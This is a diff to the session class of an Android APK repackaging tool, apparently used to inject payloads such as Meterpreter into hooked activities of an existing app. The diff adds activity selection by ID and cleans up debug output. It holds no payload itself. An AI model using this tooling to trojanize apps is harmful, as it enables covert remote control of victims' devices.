@@ -14,6 +14,7 @@ class PackadroidSession():
         self.__original_apk_dec_path = None
         self.__hooks = []
         self.__verbose = True
+        self.__activities = []
 
     def get_hooks(self):
         return self.__hooks
@@ -56,13 +57,28 @@ class PackadroidSession():
                 return None
         else:
             payload_dec_path = same_apk[0].get_payload_dec_path()
+        
+        if t == "activity":
+            try:
+                # list_activities loads and stores the activities
+                if len(self.__activities) == 0:
+                    self.list_activities()
+                # location is given as an ID
+                activity_id = int(location)
+                location = self.__activities[activity_id][0]
+            except:
+                # not an integer
+                pass
+
         self.__hooks.append(hook.Hook(t, location, class_name, method_name, payload_apk_path, payload_dec_path))
 
     def list_activities(self):
         if not self.is_original_apk_loaded():
             return None
         manifest_path = os.path.join(self.__original_apk_dec_path, "AndroidManifest.xml")
-        return manifest_analyzer.find_all_activities(manifest_path)
+        # store them for later usage
+        self.__activities = manifest_analyzer.find_all_activities(manifest_path)
+        return self.__activities
 
     def generate_meterpreter(self, ip, lport):
         """ executes meterpreter with the options given"""
@@ -108,18 +124,14 @@ class PackadroidSession():
             output = os.path.splitext(self.__original_apk_path)[0] +  "_repacked.apk"
         print("[*] Repack apk as {}".format(output))
         packer.repack_apk(self.__original_apk_dec_path, self.__hooks, output)
-
         return output
 
     def cleanup(self):
-        print("Cleanup")
-        print(self.__original_apk_dec_path)
         if self.__original_apk_dec_path != None:
             print("[*] Removing the decompiled original apk!")
             shutil.rmtree(self.__original_apk_dec_path)
 
         dec_apks = set([h.get_payload_dec_path() for h in self.__hooks])
-        print(dec_apks)
         for dec_apk_path in dec_apks:
             print("[*] Removing directory {} containing decompiled payload!")
             shutil.rmtree(dec_apk_path)
